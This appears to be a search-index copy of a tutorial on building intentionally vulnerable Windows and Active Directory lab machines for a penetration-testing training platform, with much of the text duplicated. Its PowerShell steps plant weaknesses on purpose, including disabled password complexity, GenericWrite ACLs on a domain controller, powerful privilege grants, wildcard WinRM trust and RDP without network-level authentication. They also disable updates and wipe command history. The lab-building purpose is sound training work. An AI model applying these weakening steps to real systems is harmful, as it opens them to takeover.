Files\\nssm-2.24\\win64\\nssm.exe\" install FlaskService \"C:\\Program Files\\Python39\\python.exe\" \"C:\\Projects\\test\\app.py\" # User to run the service as & \"C:\\Program Files\\nssm-2.24\\win64\\nssm.exe\" set FlaskService ObjectName 'BASED\\coaran' 'VeryBasedMoment!!' # AUTO_START on system boot & \"C:\\Program Files\\nssm-2.24\\win64\\nssm.exe\" set FlaskService Start SERVICE_AUTO_START # If it fails to start then it will attempt to start again after 20 seconds cmd /c 'sc failure FlaskService reset= 0 actions= restart/20/restart/20/restart/20' # Configuring Privileges to avoid SeImpersonatePrivilege cmd /c 'sc privs FlaskService SeChangeNotifyPrivilege/SeCreateGlobalPrivilege/SeIncreaseWorkingSetPrivilege' # Starting the service & \"C:\\Program Files\\nssm-2.24\\win64\\nssm.exe\" start FlaskService \u21d2 Example 2 : [ Running powershell script as a service ] # Creating Service & \"C:\\Program Files\\nssm-2.24\\win64\\nssm.exe\" install PSService \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \" -ExecutionPolicy Bypass -NoProfile -File C:\\Projects\\script.ps1\" # User to run the service as & \"C:\\Program Files\\nssm-2.24\\win64\\nssm.exe\" set PSService ObjectName 'BASED\\coaran' 'VeryBasedMoment!!' # AUTO_START on system boot & \"C:\\Program Files\\nssm-2.24\\win64\\nssm.exe\" set PSService Start SERVICE_AUTO_START # If it fails to start then it will attempt to start again after 20 seconds cmd /c 'sc failure PSService reset= 0 actions= restart/20/restart/20/restart/20' # Configuring Privileges to avoid SeImpersonatePrivilege cmd /c 'sc privs PSService SeChangeNotifyPrivilege/SeCreateGlobalPrivilege/SeIncreaseWorkingSetPrivilege' # Starting the service & \"C:\\Program Files\\nssm-2.24\\win64\\nssm.exe\" start PSService 2.2.4) Deploying Apache Server i) Deploying Apache using xampp : Download XAMPP from : https://sourceforge.net/projects/xampp/files/ We\u2019ll be using xampp portable, following is how you can deploy it in powershell : # Downloading and Extracting XAMPP iwr -uri 'https://webwerks.dl.sourceforge.net/project/xampp/XAMPP%20Windows/8.1.1/xampp-portable-windows-x64-8.1.1-2-VS16.zip' -outfile C:\\Windows\\Temp\\xampp.zip -TimeoutSec 9999999 Expand-Archive -LiteralPath C:\\Windows\\Temp\\xampp.zip -DestinationPath \"C:\\\" # Creating Apache Service ## Adding user net user apache \"Password!!\" /add ## Granting \"Logon as a service\" & \"Act as part of the Operating System\" privilege $Identity = \"apache\" $CarbonDllPath = \"C:\\Data\\Carbon\\bin\\Carbon.dll\" [Reflection.Assembly]::LoadFile($CarbonDllPath) [Carbon.Lsa]::GrantPrivileges( $Identity , \"SeServiceLogonRight\" ) [Carbon.Lsa]::GrantPrivileges( $Identity , \"SeTcbPrivilege\" ) ## Granting Perms cmd /c 'icacls \"C:\\xampp\" /grant apache:(OI)(CI)F /T' ## Installing Service C:\\Xampp\\apache\\bin\\httpd.exe -k install -n \"Apache HTTP Server\" cmd /c sc.exe config \"ApacheHTTPServer\" obj= \".\\apache\" password= \"Password!!\" ## Configuring privileges to avoid SeImpersonatePrivilege cmd /c sc.exe privs ApacheHTTPServer SeChangeNotifyPrivilege/SeCreateGlobalPrivilege/SeIncreaseWorkingSetPrivilege cmd /c 'sc failure ApacheHTTPServer reset= 0 actions= restart/20/restart/20/restart/20' ## Adding Firewall rule and starting the service New-NetFirewallRule -DisplayName 'Port 80 for Apache' -Profile 'Any' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 80 cmd /c sc.exe start ApacheHTTPServer Confirming the service is working fine : If the service failed to start you can take a look at the event logs to find out more information : For more info on Get-EventLog refer : https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-eventlog 2.2.5) Installing applications If you\u2019re trying to install an application on windows using the command line you should search for a guide/documentation to see if you can find anything about it. Example : [ Installing Python ] # Downloading the setup Invoke-WebRequest -uri 'https://www.python.org/ftp/python/3.9.0/python-3.9.0-amd64.exe' -outfile C:\\Windows\\Temp\\python-3.9.0.exe # Installing C:\\Windows\\Temp\\python-3.9.0.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0 Reference : https://docs.python.org/3/using/windows.html#installing-without-ui 2.2.6) Deploying MSSQL Server MSSQL Server can be easily deployed using the following commands : [ Note: Make sure to run as Administrator ] # Retrieving Setup File mkdir C:\\Downloads wget https://go.microsoft.com/fwlink/?linkid=866658 -UseBasicParsing -OutFile C:\\Downloads\\sqlexpress.exe # Extracting Setup files cmd /c 'C:\\Downloads\\sqlexpress.exe /ACTION=Download MEDIAPATH=C:\\Downloads /MEDIATYPE=Core /QUIET' sleep 30 C:\\Downloads\\SQLEXPR_x64_ENU.exe /q /x:C:\\Downloads\\SQLEXPR_2019 sleep 30 # Copying installation config copy C:\\Data\\ConfigurationFile.ini C:\\Downloads\\SQLEXPR_2019\\ConfigurationFile.ini # Installing MSSQL using the config. C:\\Downloads\\SQLEXPR_2019\\SETUP.EXE /ConfigurationFile=C:\\Downloads\\SQLEXPR_2019\\ConfigurationFile.ini /IAcceptSQLServerLicenseTerms /SAPWD='MyP@$$w0rd' ConfigurationFile.ini : https://github.com/CsEnox/just-some-stuff/blob/main/ConfigurationFile.ini You can find more information about the setup.exe arguments here : https://docs.microsoft.com/en-us/sql/database-engine/install-windows/install-sql-server-from-the-command-prompt Now to make sure that MSSQL server was successfully deployed, we\u2019ll try running some queries using Invoke-SqlCmd which is part of SqlServer module which has to be installed : # Installing the module Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force Install-Module -Name \"SqlServer\" -Force # Running Queries Invoke-SqlCmd -ServerInstance \"(local)\" -Query \"SELECT GETDATE()\" Invoke-SqlCmd -ServerInstance \"(local)\" -Query \"SELECT SERVERPROPERTY('MachineName')\" Invoke-SqlCmd -ServerInstance \"(local)\" -Query \"SELECT IS_SRVROLEMEMBER('sysadmin')\" 2.3) Wrapping Up So once you\u2019re done building the machine, you\u2019ll have to drop flags on the machine, do some more configuration and also clean any left over logs/scripts. Following is an example of how I do it for Windows & Active Directory machines : Write-Host \"[*] Wrapping Up\" Write-Host \"[+] Creating Flags\" New-Item \"C:\\Users\\Administrator\\Desktop\\proof.txt\" Set-Content \"C:\\Users\\Administrator\\Desktop\\proof.txt\" \"md5flag here\" New-Item \"C:\\Users\\coaran\\Desktop\\local.txt\" Set-Content \"C:\\Users\\coaran\\Desktop\\local.txt\" \"md5 flag here\" Write-Host \"[+] Disabling IPv6\" Disable-NetAdapterBinding -Name \"*\" -ComponentID ms_tcpip6 Write-Host \"[+] Disabling Sleep Mode\" powercfg /Change monitor-timeout-ac 0 powercfg /Change monitor-timeout-dc 0 powercfg /Change standby-timeout-ac 0 powercfg /Change standby-timeout-dc 0 powercfg /Change hibernate-timeout-ac 0 powercfg /Change hibernate-timeout-dc 0 Write-Host \"[+] Disabling Windows Update\" sc stop WaasMedicSvc sc stop wuauserv sc stop UsoSvc Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\wuauserv\" -Name \"Start\" -Value 4 Write-Host \"[+] Cleaning Up\" Remove-Item -path C:\\Windows\\Temp\\* -Recurse -Force Remove-Item \"C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*\" -Recurse -Force -ErrorAction SilentlyContinue Remove-Item \"C:\\Users\\*\\AppData\\Local\\Temp\\*\" -Recurse -Force -ErrorAction SilentlyContinue Remove-Item \"C:\\`$Recycle.Bin\\*\" -Recurse -Force -ErrorAction SilentlyContinue Remove-Item \"C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\" -Force -ErrorAction SilentlyContinue 3) The End Thank you for reading through the guide and I hope things that I\u2019ve provided will be helpful. If you have any questions you can reach out to me on Offensive Security Discord (Discord Tag : Enox#4458) or Twitter (@csenox1)","title":"Art of Creating Machines"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Art%20of%20Creating%20Machines/#art-of-creating-machines","text":"","title":"Art of Creating Machines"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Art%20of%20Creating%20Machines/#1-getting-started","text":"","title":"1) Getting Started"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Art%20of%20Creating%20Machines/#11-introduction-to-ugc-program","text":"User-Generated Content Program is a program that allows people to make submission to Offensive Security Proving Grounds lab and receive compensation upon acceptance after being reviewed by the Labs Team. As of 11th January 2022, the rewards are as following: You can find more information here : https://www.offensive-security.com/labs/submit/ https://help.offensive-security.com/hc/en-us/articles/360049610511-User-Generated-Content-FAQ","title":"1.1) Introduction to UGC Program"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Art%20of%20Creating%20Machines/#12-researching","text":"So before starting to build a machine, you\u2019ll have to first perform a lot of researching to develop an idea for the machine. Following are some examples of what I personally do : Great place to start would be on twitter and look for any interesting research by companies / individuals. You should also bookmark them so you can check regularly if they added anything new. Stay updated on new vulnerabilities through twitter or The Daily Swig by PortSwigger. If you\u2019re planning to build a CVE based machine, browsing through exploit-db.com and cve.mitre.org will be very helpful. Keep an eye on Exploit Database Security Papers for new papers. In the end it all comes down to how creative you can be with vulnerabilities you have discovered and if they go well with each other to make a complete machine. You can reach out to the Labs Team on Offensive Security Discord in #user-generated-content channel to get your ideas reviewed by them before proceeding to make the machine.","title":"1.2) Researching"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Art%20of%20Creating%20Machines/#13-setting-up-environment","text":"You can use Vagrant to easily deploy and destroy VM\u2019s on VMware / VirtualBox. Following links will be helpful for the installation and configuring the providers : https://www.vagrantup.com/docs/installation [ Vagrant Installation ] https://www.vagrantup.com/docs/providers/virtualbox [ VirtualBox Provider ] https://www.vagrantup.com/docs/providers/vmware/installation [ Installing VMware provider ] https://vagrantcloud.com/search [ VM Images ] **","title":"1.3) Setting up Environment"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Art%20of%20Creating%20Machines/#131-linux-environment","text":"Following is an example on how to deploy a Ubuntu 20.04 VM using vagrant on VMware provider : i) Create a directory with the following structure : box directory here will be used for the Vagrant environment. data directory will be mounted on the machine so we can share files easily. ii) Move into box directory and run the following command to initialize the directory to be a Vagrant environment by creating an initial Vagrantfile : vagrant init bento/ubuntu-20.04 iii) Next step is to edit VagrantFile : Editing VM provider to vmware_desktop and mounting data directory on the machine : iv) For deploying the VM, run the following command from the box directory : vagrant up v) To interact with the box, you can ssh by running the following command from the box directory : vagrant ssh vi) To stop the VM, run the following command : vagrant halt vii) To destroy the VM, run the following command : [ NOTE: Everything will be lost except files in data directory ] vagrant destroy","title":"1.3.1) Linux Environment"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Art%20of%20Creating%20Machines/#132-windows-environment","text":"Following is an example on how to deploy a Windows Server 2019 Standard Desktop VM using vagrant on VMware provider : i) Create a directory with the following structure : box directory here will be used for the Vagrant environment. data directory will be mounted on the machine so we can share files easily. ii) Move into box directory and run the following command to initialize the directory to be a Vagrant environment by creating an initial Vagrantfile : vagrant init gusztavvargadr/windows-server-2019-standard-desktop iii) Next step is to edit VagrantFile : Editing VM provider to vmware_desktop and mounting data directory on the machine : iv) For deploying the VM, run the following command from the box directory : vagrant up v) To interact with the box, you can ssh by running the following command from the box directory : vagrant ssh vi) To stop the VM, run the following command : vagrant halt vii) To destroy the VM, run the following command : [ NOTE: Everything will be lost except files in data directory ] vagrant destroy","title":"1.3.2) Windows Environment"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Art%20of%20Creating%20Machines/#2-building-machines","text":"In this section you will find some examples on how to setup / configure certain things for Active Directory and Windows using PowerShell. It will help you get the idea on how things are done.","title":"2) Building Machines"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Art%20of%20Creating%20Machines/#21-active-directory","text":"","title":"2.1) Active Directory"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Art%20of%20Creating%20Machines/#211-setting-up-an-active-directory-domain","text":"i) After deploying a Windows Server 2019 VM, we\u2019ll change the administrator password and rename the machine using the following powershell commands : # Changing Admin Password net user administrator 'P@$$w0rd!1234' /active:yes # Changing Machine name $SecPassword = ConvertTo-SecureString 'P@$$w0rd!1234' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPassword) Rename-Computer -NewName \"DC01\" -DomainCredential $Cred -Restart Machine will reboot in the end. ii) Next we\u2019ll be configuring DNS , installing active directory domain services and promote the server to a domain controller using the following powershell commands : # Setting DNS Server Addresses Set-DnsClientServerAddress -InterfaceIndex (Get-NetAdapter).InterfaceIndex -ServerAddresses (\"127.0.0.1\",\"8.8.8.8\") # Installing AD Domain Services Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools # Promoting to a domain controller $SecPassword = ConvertTo-SecureString 'P@$$w0rd!1234' -AsPlainText -Force Install-ADDSForest -DomainName \"based.offsec\" -CreateDnsDelegation:$false -DatabasePath \"C:\\Windows\\NTDS\" -SafeModeAdministratorPassword $SecPassword -DomainMode \"7\" -DomainNetbiosName \"BASED\" -ForestMode \"7\" -InstallDns:$true -LogPath \"C:\\Windows\\NTDS\" -SysvolPath \"C:\\Windows\\SYSVOL\" -Force:$true For better understanding of Install-ADDSForest arguments please refer : https://docs.microsoft.com/en-us/powershell/module/addsdeployment/install-addsforest Machine will reboot in the end.","title":"2.1.1) Setting up an Active Directory Domain"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Art%20of%20Creating%20Machines/#212-joining-a-machine-to-active-directory-domain","text":"i) After deploying a windows vm of your choice , we\u2019ll change the local administrator password and rename the machine using the following powershell commands : # Changing Admin Password net user administrator 'ClientMachine123!!' /active:yes # Changing Machine name $SecPassword = ConvertTo-SecureString 'ClientMachine123!!' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPassword) Rename-Computer -NewName \"CLIENT01\" -DomainCredential $Cred -Restart Machine will reboot in the end. ii) Next we\u2019ll be configuring the DNS and connecting to the AD Domain : # Setting DNS Write-Host \"[2] Setting DNS and Connecting to Domain\" $DC01= Read-Host \"Enter DC01 IP Address\" Set-DnsClientServerAddress -InterfaceIndex (Get-NetAdapter).InterfaceIndex -ServerAddresses (\"$DC01\",\"8.8.8.8\") # Adding CLIENT01 to based.offsec domain $SecPassword = ConvertTo-SecureString 'P@$$w0rd!1234' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('BASED\\Administrator', $SecPassword) Add-Computer -DomainName based.offsec -Credential $Cred -Restart -Force DC01 should be running. Machine will reboot in the end.","title":"2.1.2) Joining a machine to Active Directory Domain"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Art%20of%20Creating%20Machines/#213-setting-up-child-domain","text":"i) After deploying a Windows Server 2019 VM, we\u2019ll change the administrator password and rename the machine using the following powershell commands : # Changing Admin Password net user administrator 'VeryBasedIndeed123!' # Changing Machine name $SecPassword = ConvertTo-SecureString 'VeryBasedIndeed123!' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPassword) Rename-Computer -NewName \"DC02\" -DomainCredential $Cred -Restart Machine will reboot in the end. ii) Next we\u2019ll be configuring DNS , Installing Active Directory domain services and promoting to a domain controller in a child domain ( child.based.offsec ) : # Setting DNS Ip Address as DC01 $DC01= Read-Host \"Enter DC01 IP Address\" Set-DnsClientServerAddress -InterfaceIndex (Get-NetAdapter).InterfaceIndex -ServerAddresses (\"$DC01\",\"8.8.8.8\") # Installing AD Domain Services Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools # Promoting to a domain controller $SecPassword = ConvertTo-SecureString 'P@$$w0rd!1234' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('BASED\\Administrator', $SecPassword) Install-ADDSDomain -Credential $Cred -NewDomainName \"child\" -ParentDomainName \"based.offsec\" -InstallDNS -CreateDNSDelegation -NewDomainNetbiosName \"CHILD\" -DomainMode \"7\" -ReplicationSourceDC \"DC01.based.offsec\" -SafeModeAdministratorPassword $SecPassword -DatabasePath \"C:\\Windows\\NTDS\" -LogPath \"C:\\Windows\\NTDS\" -SysvolPath \"C:\\Windows\\SYSVOL\" -Force:$true For better understanding of Install-ADDSDomain arguments, please refer : https://docs.microsoft.com/en-us/powershell/module/addsdeployment/install-addsdomain DC01 should be running. Machine will reboot in the end.","title":"2.1.3) Setting up Child Domain"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Art%20of%20Creating%20Machines/#214-configuring-services","text":"i) Configuring WinRM using PowerShell : Set-Service WinRM -StartMode Automatic # Verify start mode and state - it should be running Get-WmiObject -Class win32_service | Where-Object {$_.name -like \"WinRM\"} Set-Item WSMan:localhost\\client\\trustedhosts -Value * -Force # Opening WinRM port in firewall netsh advfirewall firewall add rule name=\"WinRM-HTTP\" dir=in localport=5985 protocol=TCP action=allow ii) Configuring RDP using PowerShell : Set-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\' -Name \"fDenyTSConnections\" -Value 0 Set-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\\' -Name \"UserAuthentication\" -Value 0 Enable-NetFirewallRule -DisplayGroup \"Remote Desktop\" iii) Installing ADCS using PowerShell : Add-WindowsFeature Adcs-Cert-Authority -IncludeManagementTools Install-AdcsCertificationAuthority -CAType EnterpriseRootCA -Force:$true","title":"2.1.4) Configuring Services"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Art%20of%20Creating%20Machines/#215-configuring-ad-accounts","text":"i) Disabling password complexity : secedit /export /cfg c:\\secpol.cfg (gc C:\\secpol.cfg).replace(\"PasswordComplexity = 1\", \"PasswordComplexity = 0\") | Out-File C:\\secpol.cfg secedit /configure /db c:\\windows\\security\\local.sdb /cfg c:\\secpol.cfg /areas SECURITYPOLICY rm -force c:\\secpol.cfg -confirm:$false gpupdate /force ii) Adding user to an AD domain : $UserPassword = ConvertTo-SecureString 'password123' -AsPlainText -Force New-ADUser -Name \"Enox\" -GivenName \"Enox\" -SamAccountName \"enox\" -AccountPassword $UserPassword -ChangePasswordAtLogon $False -Enabled $True iii) Active Directory Groups : \u21d2 Remote Management Users - users part of this group are able to WinRM to the machine. net localgroup \"Remote Management Users\" /add enox /dom \u21d2 Remote Desktop Users - users part of this group are able to RDP to the machine. [ NOTE: You\u2019ll also have to grant the user SeRemoteInteractiveLogonRight ] # Adding user to Remote Desktop Users group net localgroup \"Remote Desktop Users\" /add enox /dom # Granting SeRemoteInteractiveLogonRight using Carbon $Identity = \"BASED\\enox\" $CarbonDllPath = \"C:\\Data\\Carbon\\bin\\Carbon.dll\" [Reflection.Assembly]::LoadFile($CarbonDllPath) [Carbon.Lsa]::GrantPrivileges( $Identity , \"SeRemoteInteractiveLogonRight\" ) Carbon Download Link : http://get-carbon.org/about_Carbon_Installation.html iv) Configuring ACLs : Granting GenericWrite on a user [ siddicky \u2192 GenericWrite \u2192 enox ] : $ADSI = [ADSI]\"LDAP://CN=Enox,CN=Users,DC=based,DC=offsec\" $IdentityReference = (New-Object System.Security.Principal.NTAccount(\"siddicky\")).Translate([System.Security.Principal.SecurityIdentifier]) $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,\"GenericWrite\",\"Allow\" $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE) $ADSI.psbase.commitchanges() Granting GenericWrite on Domain Controller [ enox \u2192 GenericWrite \u2192 DC01 ] : $ADSI = [ADSI]\"LDAP://CN=DC01,OU=Domain Controllers,DC=based,DC=offsec\" $IdentityReference = (New-Object System.Security.Principal.NTAccount(\"enox\")).Translate([System.Security.Principal.SecurityIdentifier]) $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,\"GenericWrite\",\"Allow\" $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE) $ADSI.psbase.commitchanges() v) Granting a domain user privilege to logon locally on DC : $Identity = \"BASED\\siddicky\" $CarbonDllPath = \"C:\\Data\\Carbon\\bin\\Carbon.dll\" [Reflection.Assembly]::LoadFile($CarbonDllPath) [Carbon.Lsa]::GrantPrivileges( $Identity , \"SeInteractiveLogonRight\" )","title":"2.1.5) Configuring AD Accounts"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Art%20of%20Creating%20Machines/#22-windows","text":"Please check pinned messages in #user-generated-content channel on Offensive Security discord to get the sample build script for windows.","title":"2.2) Windows"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Art%20of%20Creating%20Machines/#221-setting-up-an-windows-machine","text":"After deploying a Windows VM, we\u2019ll change the administrator password and rename the machine using the following powershell commands : # Changing Admin Password net user administrator 'MakingMachines2022!!' /active:yes # Changing Machine name to BASED $SecPassword = ConvertTo-SecureString 'MakingMachines2022!!' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPassword) Rename-Computer -NewName \"BASED\" -DomainCredential $Cred -Restart Machine will reboot in the end.","title":"2.2.1) Setting up an Windows Machine"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Art%20of%20Creating%20Machines/#222-configuring-windows-accounts","text":"i) Creating user : # Creating user net user coaran \"VeryBasedMoment!!\" /add ## Configuring User Profile $password = ConvertTo-SecureString 'VeryBasedMoment!!' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('BASED\\coaran', $password) Start-Process PowerShell -Cred $Cred -ArgumentList 'whoami' ii) Granting Privileges using Carbon : You can find list of privileges that can be granted using Carbon here Example granting SeBackupPrivilege : # Giving Privileges $Identity = \"coaran\" $CarbonDllPath = \"C:\\Data\\Carbon\\bin\\Carbon.dll\" [Reflection.Assembly]::LoadFile($CarbonDllPath) [Carbon.Lsa]::GrantPrivileges( $Identity , \"SeBackupPrivilege\" )","title":"2.2.2) Configuring Windows Accounts"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Art%20of%20Creating%20Machines/#223-creating-services-using-nssm","text":"If you have ever wanted to create a service that for example runs a flask application or a powershell script you can use nssm to set it up. Installing nssm on the machine using powershell : # Downloading nssm Invoke-WebRequest -uri 'https://nssm.cc/release/nssm-2.24.zip' -outfile C:\\Windows\\Temp\\nssm.zip # Unzipping the files to C:\\Program Files Expand-Archive -LiteralPath C:\\Windows\\Temp\\nssm.zip -DestinationPath \"C:\\Program Files\" # Granting read and execute perms for everyone cmd /c 'icacls \"C:\\Program Files\\nssm-2.24\" /grant Everyone:rx /T' \u21d2 Example 1 : [ Running a flask application as a service ] # Creating service & \"C:\\Program Files\\nssm-2.24\\win64\\nssm.exe\" install FlaskService \"C:\\Program Files\\Python39\\python.exe\" \"C:\\Projects\\test\\app.py\" # User to run the service as & \"C:\\Program Files\\nssm-2.24\\win64\\nssm.exe\" set FlaskService ObjectName 'BASED\\coaran' 'VeryBasedMoment!!' # AUTO_START on system boot & \"C:\\Program Files\\nssm-2.24\\win64\\nssm.exe\" set FlaskService Start SERVICE_AUTO_START # If it fails to start then it will attempt to start again after 20 seconds cmd /c 'sc failure FlaskService reset= 0 actions= restart/20/restart/20/restart/20' # Configuring Privileges to avoid SeImpersonatePrivilege cmd /c 'sc privs FlaskService SeChangeNotifyPrivilege/SeCreateGlobalPrivilege/SeIncreaseWorkingSetPrivilege' # Starting the service & \"C:\\Program Files\\nssm-2.24\\win64\\nssm.exe\" start FlaskService \u21d2 Example 2 : [ Running powershell script as a service ] # Creating Service & \"C:\\Program Files\\nssm-2.24\\win64\\nssm.exe\" install PSService \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \" -ExecutionPolicy Bypass -NoProfile -File C:\\Projects\\script.ps1\" # User to run the service as & \"C:\\Program Files\\nssm-2.24\\win64\\nssm.exe\" set PSService ObjectName 'BASED\\coaran' 'VeryBasedMoment!!' # AUTO_START on system boot & \"C:\\Program Files\\nssm-2.24\\win64\\nssm.exe\" set PSService Start SERVICE_AUTO_START # If it fails to start then it will attempt to start again after 20 seconds cmd /c 'sc failure PSService reset= 0 actions= restart/20/restart/20/restart/20' # Configuring Privileges to avoid SeImpersonatePrivilege cmd /c 'sc privs PSService SeChangeNotifyPrivilege/SeCreateGlobalPrivilege/SeIncreaseWorkingSetPrivilege' # Starting the service & \"C:\\Program Files\\nssm-2.24\\win64\\nssm.exe\" start PSService","title":"2.2.3) Creating Services using nssm"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Art%20of%20Creating%20Machines/#224-deploying-apache-server","text":"i) Deploying Apache using xampp : Download XAMPP from : https://sourceforge.net/projects/xampp/files/ We\u2019ll be using xampp portable, following is how you can deploy it in powershell : # Downloading and Extracting XAMPP iwr -uri 'https://webwerks.dl.sourceforge.net/project/xampp/XAMPP%20Windows/8.1.1/xampp-portable-windows-x64-8.1.1-2-VS16.zip' -outfile C:\\Windows\\Temp\\xampp.zip -TimeoutSec 9999999 Expand-Archive -LiteralPath C:\\Windows\\Temp\\xampp.zip -DestinationPath \"C:\\\" # Creating Apache Service ## Adding user net user apache \"Password!!\" /add ## Granting \"Logon as a service\" & \"Act as part of the Operating System\" privilege $Identity = \"apache\" $CarbonDllPath = \"C:\\Data\\Carbon\\bin\\Carbon.dll\" [Reflection.Assembly]::LoadFile($CarbonDllPath) [Carbon.Lsa]::GrantPrivileges( $Identity , \"SeServiceLogonRight\" ) [Carbon.Lsa]::GrantPrivileges( $Identity , \"SeTcbPrivilege\" ) ## Granting Perms cmd /c 'icacls \"C:\\xampp\" /grant apache:(OI)(CI)F /T' ## Installing Service C:\\Xampp\\apache\\bin\\httpd.exe -k install -n \"Apache HTTP Server\" cmd /c sc.exe config \"ApacheHTTPServer\" obj= \".\\apache\" password= \"Password!!\" ## Configuring privileges to avoid SeImpersonatePrivilege cmd /c sc.exe privs ApacheHTTPServer SeChangeNotifyPrivilege/SeCreateGlobalPrivilege/SeIncreaseWorkingSetPrivilege cmd /c 'sc failure ApacheHTTPServer reset= 0 actions= restart/20/restart/20/restart/20' ## Adding Firewall rule and starting the service New-NetFirewallRule -DisplayName 'Port 80 for Apache' -Profile 'Any' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 80 cmd /c sc.exe start ApacheHTTPServer Confirming the service is working fine : If the service failed to start you can take a look at the event logs to find out more information : For more info on Get-EventLog refer : https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-eventlog","title":"2.2.4) Deploying Apache Server"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Art%20of%20Creating%20Machines/#225-installing-applications","text":"If you\u2019re trying to install an application on windows using the command line you should search for a guide/documentation to see if you can find anything about it. Example : [ Installing Python ] # Downloading the setup Invoke-WebRequest -uri 'https://www.python.org/ftp/python/3.9.0/python-3.9.0-amd64.exe' -outfile C:\\Windows\\Temp\\python-3.9.0.exe # Installing C:\\Windows\\Temp\\python-3.9.0.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0 Reference : https://docs.python.org/3/using/windows.html#installing-without-ui","title":"2.2.5) Installing applications"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Art%20of%20Creating%20Machines/#226-deploying-mssql-server","text":"MSSQL Server can be easily deployed using the following commands : [ Note: Make sure to run as Administrator ] # Retrieving Setup File mkdir C:\\Downloads wget https://go.microsoft.com/fwlink/?linkid=866658 -UseBasicParsing -OutFile C:\\Downloads\\sqlexpress.exe # Extracting Setup files cmd /c 'C:\\Downloads\\sqlexpress.exe /ACTION=Download MEDIAPATH=C:\\Downloads /MEDIATYPE=Core /QUIET' sleep 30 C:\\Downloads\\SQLEXPR_x64_ENU.exe /q /x:C:\\Downloads\\SQLEXPR_2019 sleep 30 # Copying installation config copy C:\\Data\\ConfigurationFile.ini C:\\Downloads\\SQLEXPR_2019\\ConfigurationFile.ini # Installing MSSQL using the config. C:\\Downloads\\SQLEXPR_2019\\SETUP.EXE /ConfigurationFile=C:\\Downloads\\SQLEXPR_2019\\ConfigurationFile.ini /IAcceptSQLServerLicenseTerms /SAPWD='MyP@$$w0rd' ConfigurationFile.ini : https://github.com/CsEnox/just-some-stuff/blob/main/ConfigurationFile.ini You can find more information about the setup.exe arguments here : https://docs.microsoft.com/en-us/sql/database-engine/install-windows/install-sql-server-from-the-command-prompt Now to make sure that MSSQL server was successfully deployed, we\u2019ll try running some queries using Invoke-SqlCmd which is part of SqlServer module which has to be installed : # Installing the module Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force Install-Module -Name \"SqlServer\" -Force # Running Queries Invoke-SqlCmd -ServerInstance \"(local)\" -Query \"SELECT GETDATE()\" Invoke-SqlCmd -ServerInstance \"(local)\" -Query \"SELECT SERVERPROPERTY('MachineName')\" Invoke-SqlCmd -ServerInstance \"(local)\" -Query \"SELECT IS_SRVROLEMEMBER('sysadmin')\"","title":"2.2.6) Deploying MSSQL Server"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Art%20of%20Creating%20Machines/#23-wrapping-up","text":"So once you\u2019re done building the machine, you\u2019ll have to drop flags on the machine, do some more configuration and also clean any left over logs/scripts. Following is an example of how I do it for Windows & Active Directory machines : Write-Host \"[*] Wrapping Up\" Write-Host \"[+] Creating Flags\" New-Item \"C:\\Users\\Administrator\\Desktop\\proof.txt\" Set-Content \"C:\\Users\\Administrator\\Desktop\\proof.txt\" \"md5flag here\" New-Item \"C:\\Users\\coaran\\Desktop\\local.txt\" Set-Content \"C:\\Users\\coaran\\Desktop\\local.txt\" \"md5 flag here\" Write-Host \"[+] Disabling IPv6\" Disable-NetAdapterBinding -Name \"*\" -ComponentID ms_tcpip6 Write-Host \"[+] Disabling Sleep Mode\" powercfg /Change 